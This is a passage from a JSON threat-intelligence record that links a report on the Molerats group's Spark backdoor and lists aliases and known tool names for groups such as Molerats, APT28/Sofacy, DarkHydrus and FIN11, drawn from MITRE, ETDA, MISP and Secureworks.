            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-03 - Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations.pdf"
    ],
    "report_names": [
        "2020-03-03 - Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations.pdf"
    ],
    "threat_actors": [
        {
            "id": "4fe925e8-95e5-4a63-9f96-4d0f9bedac08",
            "created_at": "2022-10-25T15:50:23.469077Z",
            "updated_at": "2025-03-27T02:00:55.478056Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "DarkHydrus"
            ],
            "source_name": "MITRE:DarkHydrus",
            "tools": [
                "Mimikatz",
                "RogueRobin",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "acae6371-5530-498a-8b99-c2f55652ffd5",
            "created_at": "2022-10-25T16:07:23.980316Z",
            "updated_at": "2025-03-27T02:02:10.061182Z",
            "deleted_at": null,
            "main_name": "Operation Parliament",
            "aliases": [],
            "source_name": "ETDA:Operation Parliament",
            "tools": [
                "Remote CMD/PowerShell terminal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6728f306-6259-4e7d-a4ea-59586d90a47d",
            "created_at": "2023-01-06T13:46:39.175292Z",
            "updated_at": "2025-03-27T02:00:03.013291Z",
            "deleted_at": null,
            "main_name": "FIN11",
            "aliases": [
                "TEMP.Warlock",
                "UNC902"
            ],
            "source_name": "MISPGALAXY:FIN11",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3bda9919-b9cd-451c-89e6-c7674f8c6257",
            "created_at": "2023-01-06T13:46:38.782181Z",
            "updated_at": "2025-03-27T02:00:02.917403Z",
            "deleted_at": null,
            "main_name": "Operation Parliament",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Parliament",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1162e0d4-b69c-423d-a4da-f3080d1d2b0c",
            "created_at": "2023-01-06T13:46:38.508262Z",
            "updated_at": "2025-03-27T02:00:02.851407Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "Gaza Hackers Team",
                "Gaza cybergang",
                "Gaza Cybergang",
                "Operation Molerats",
                "Extreme Jackal",
                "ALUMINUM SARATOGA",
                "G0021",
                "BLACKSTEM"
            ],
            "source_name": "MISPGALAXY:Molerats",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "0c502f6d-640d-4e69-bfb8-328ba6540d4f",
            "created_at": "2022-10-25T15:50:23.756782Z",
            "updated_at": "2025-03-27T02:00:55.539397Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "Molerats",
                "Operation Molerats",
                "Gaza Cybergang"
            ],
            "source_name": "MITRE:Molerats",
            "tools": [
                "MoleNet",
                "DustySky",
                "DropBook",
                "SharpStage",
                "PoisonIvy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "6efb28db-4d91-46cb-8ab7-fe9e8449ccfc",
            "created_at": "2023-01-06T13:46:38.772861Z",
            "updated_at": "2025-03-27T02:00:02.914846Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "Obscure Serpens",
                "LazyMeerkat",
                "G0079"
            ],
            "source_name": "MISPGALAXY:DarkHydrus",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "847f600c-cf90-44c0-8b39-fb0d5adfcef4",
            "created_at": "2022-10-25T16:07:23.875541Z",
            "updated_at": "2025-03-27T02:02:10.005591Z",
            "deleted_at": null,
            "main_name": "Molerats",
            "aliases": [
                "ATK 89",
                "Aluminum Saratoga",
                "Extreme Jackal",
                "Gaza Cybergang",
                "Gaza Hackers Team",
                "Molerats",
                "Operation DustySky",
                "Operation DustySky Part 2",
                "Operation Molerats",
                "Operation Moonlight",
                "Operation SneakyPastes",
                "Operation TopHat",
                "TA402",
                "TAG-CT5"
            ],
            "source_name": "ETDA:Molerats",
            "tools": [
                "BadPatch",
                "Bladabindi",
                "BrittleBush",
                "Chymine",
                "CinaRAT",
                "Darkmoon",
                "Downeks",
                "DropBook",
                "DustySky",
                "ExtRat",
                "Gen:Trojan.Heur.PT",
                "H-Worm",
                "H-Worm RAT",
                "Houdini",
                "Houdini RAT",
                "Hworm",
                "Iniduoh",
                "IronWind",
                "Jenxcus",
                "JhoneRAT",
                "Jorik",
                "KasperAgent",
                "Kognito",
                "LastConn",
                "Micropsia",
                "MoleNet",
                "Molerat Loader",
                "NeD Worm",
                "NimbleMamba",
                "Njw0rm",
                "Pierogi",
                "Poison Ivy",
                "Quasar RAT",
                "QuasarRAT",
                "SPIVY",
                "Scote",
                "SharpSploit",
                "SharpStage",
                "WSHRAT",
                "WelcomeChat",
                "Xtreme RAT",
                "XtremeRAT",
                "Yggdrasil",
                "dinihou",
                "dunihi",
                "njRAT",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "efe6ff9a-822d-41a6-90c3-45265cac696b",
            "created_at": "2024-05-01T02:03:07.920302Z",
            "updated_at": "2025-03-27T02:05:17.246342Z",
            "deleted_at": null,
            "main_name": "ALUMINUM SARATOGA",
            "aliases": [
                "Arid Viper",
                "Desert Falcon",
                "Extreme Jackal ",
                "Gaza CyberGang",
                "Gaza CyberGang",
                "Molerats ",
                "Operation DustySky ",
                "TA402",
                "APT-C-23"
            ],
            "source_name": "Secureworks:ALUMINUM SARATOGA",
            "tools": [
                " BrittleBush",
                " DarkComet",
                " LastConn",
                " Micropsia",
                " NimbleMamba",
                " PoisonIvy",
                " QuasarRAT",
                " XtremeRat",
                "BlackShades"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5b04780e-7b64-4e62-b776-c6749ff7dec8",
            "created_at": "2022-10-25T16:07:23.531741Z",
            "updated_at": "2025-03-27T02:02:09.84903Z",
            "deleted_at": null,
            "main_name": "DarkHydrus",
            "aliases": [
                "ATK 77",
                "DarkHydrus",
                "LazyMeerkat",
                "Obscure Serpens"
            ],
            "source_name": "ETDA:DarkHydrus",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Mimikatz",
                "Phishery",
                "RogueRobin",
                "RogueRobinNET",
                "Trojan.Phisherly",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1db21349-11d6-4e57-805c-fb1e23a8acab",
            "created_at": "2022-10-25T16:07:23.630365Z",
            "updated_at": "2025-03-27T02:02:09.897138Z",
            "deleted_at": null,
            "main_name": "FIN11",
            "aliases": [
                "DEV-0950",
                "Lace Tempest",
                "Operation Cyclone"
            ],
            "source_name": "ETDA:FIN11",
            "tools": [
                "AZORult",
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "BLUESTEAL",
                "Cl0p",
                "EMASTEAL",
                "FLOWERPIPE",
                "FORKBEARD",
                "FRIENDSPEAK",
                "FlawedAmmyy",
                "GazGolder",
                "Get2",
                "GetandGo",
                "JESTBOT",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MINEDOOR",
                "MIXLABEL",
                "Meterpreter",
                "NAILGUN",
                "POPFLASH",
                "PuffStealer",
                "Rultazo",
                "SALTLICK",
                "SCRAPMINT",
                "SHORTBENCH",
                "SLOWROLL",
                "SPOONBEARD",
                "TiniMet",
                "TinyMet",
                "VIDAR",
                "Vidar Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536075,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653698159,
    "ts_modification_date": 1653698159,
    "files": {
        "pdf": "https://archive.orkl.eu/aff88247ebf40f7e53f7854280032cec8ac447e7.pdf",
        "text": "https://archive.orkl.eu/aff88247ebf40f7e53f7854280032cec8ac447e7.txt",
        "img": "https://archive.orkl.eu/aff88247ebf40f7e53f7854280032cec8ac447e7.jpg"
    }
}